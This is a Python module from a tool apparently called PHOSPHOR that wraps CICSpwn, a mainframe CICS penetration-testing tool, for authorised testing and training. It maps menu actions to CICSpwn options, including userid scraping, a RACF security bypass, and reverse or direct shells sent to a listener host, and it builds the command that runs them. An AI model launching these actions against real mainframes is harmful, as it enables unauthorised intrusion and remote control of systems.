"""CICSpwn options for PHOSPHOR.

PHOSPHOR already runs CICSpwn without x3270 by injecting a PHOSPHOR-backed emulator
(see ``phosphor.run_cicspwn``). This module surfaces CICSpwn's option groups so they can
be picked from the client and turned into (a) the argparse ``results`` namespace CICSpwn
expects, and (b) the console command to run.

Authorised testing / GIBSON training only. CICSpwn itself is the user's file; PHOSPHOR
only builds the options and drives it.
"""
from __future__ import annotations

from types import SimpleNamespace
from typing import Dict, List, Optional
import os

# Every argparse dest CICSpwn.main() reads, with its default.
DEFAULTS: Dict[str, object] = dict(
    applid="CICS", all_options=False, info=False, userids=False, pattern="*",
    journal=False, ceci="CECI", cemt="CEMT", bypass=False, old_tran=None, new_tran=None,
    custom_cics=False, trans=False, ena_trans=None, check_trans=None,
    files=False, tsqueues=False, filename=None, tsq_name=None, filename_add=None,
    tsqueue_add=None, item=None, data=None, check_files=None,
    userid=None, password=None, propagate_user=False, surrogat_user=False,
    submit=None, queue=None, ftp_cmds=None, node=None, lhost=None, port="4445",
    jcl=None, rexx_file=None,
)

# (id, menu label, results overrides, required extra fields)
ACTIONS = [
    ("info",       "Region info (-i)",                    {"info": True},               []),
    ("all",        "Gather all (-A)",                     {"all_options": True},        []),
    ("userids",    "Scrape userids (-u)",                 {"userids": True},            []),
    ("trans",      "List transactions (-t)",              {"trans": True},              []),
    ("files",      "List files (-f)",                     {"files": True},              []),
    ("tsqueues",   "List TS queues (-e)",                 {"tsqueues": True},           []),
    ("bypass",     "CEDA RACF bypass (--bypass)",         {"bypass": True},             []),
    ("dummy",      "Dummy submit test (-s dummy)",        {"submit": "dummy"},          []),
    ("rev_tso",    "Reverse TSO shell (-s reverse_tso)",  {"submit": "reverse_tso"},    ["lhost"]),
    ("rev_unix",   "Reverse UNIX shell (-s reverse_unix)", {"submit": "reverse_unix"},  ["lhost"]),
    ("direct_unix", "Direct UNIX shell (-s direct_unix)", {"submit": "direct_unix"},    ["lhost"]),
    ("ftp",        "FTP submit (-s ftp)",                 {"submit": "ftp"},            []),
]
_ACTION_MAP = {a[0]: a for a in ACTIONS}


def action_ids() -> List[str]:
    return [a[0] for a in ACTIONS]


def describe(action_id: str) -> str:
    a = _ACTION_MAP.get(action_id)
    return a[1] if a else action_id


def requires(action_id: str) -> List[str]:
    a = _ACTION_MAP.get(action_id)
    return list(a[3]) if a else []


def build_results(host: str, port, action_id: str, applid: str = "CICS",
                  userid: Optional[str] = None, password: Optional[str] = None,
                  lhost: Optional[str] = None, pattern: Optional[str] = None) -> SimpleNamespace:
    """The argparse-style namespace CICSpwn.main() consumes."""
    r = dict(DEFAULTS)
    r["IP"] = host
    r["PORT"] = str(port)
    r["applid"] = (applid or "CICS").upper()
    a = _ACTION_MAP.get(action_id)
    if a:
        r.update(a[2])
    if userid:
        r["userid"] = userid
    if password:
        r["password"] = password
    if lhost:
        r["lhost"] = lhost
    if pattern:
        r["pattern"] = pattern
    return SimpleNamespace(**r)


def build_command(cicspwn_path: str, host: str, port, action_id: str, applid: str = "CICS",
                  userid: Optional[str] = None, password: Optional[str] = None,
                  lhost: Optional[str] = None) -> str:
    """The console command that runs CICSpwn through PHOSPHOR's emulator."""
    parts = ["python3", "-m", "phosphor.run_cicspwn", cicspwn_path, host, str(port),
             "--action", action_id, "--applid", (applid or "CICS")]
    if userid:
        parts += ["--userid", userid]
    if password:
        parts += ["--password", password]
    if lhost:
        parts += ["--lhost", lhost]
    return " ".join(parts)


def validate(action_id: str, lhost: Optional[str] = None) -> Optional[str]:
    """Return an error string if the action is missing a required field, else None."""
    for need in requires(action_id):
        if need == "lhost" and not lhost:
            return "This action submits a reverse shell - set a listener (lhost host:port) first."
    return None


def cicspwn_path() -> Optional[str]:
    """Locate the user's cicspwn.py: env PHOSPHOR_CICSPWN, then the tools/working dir."""
    p = os.environ.get("PHOSPHOR_CICSPWN")
    if p and os.path.exists(p):
        return p
    for base in (os.environ.get("PHOSPHOR_TOOLS_DIR") or "", os.getcwd()):
        if base:
            cand = os.path.join(base, "cicspwn.py")
            if os.path.exists(cand):
                return cand
    return None


def available() -> bool:
    return cicspwn_path() is not None
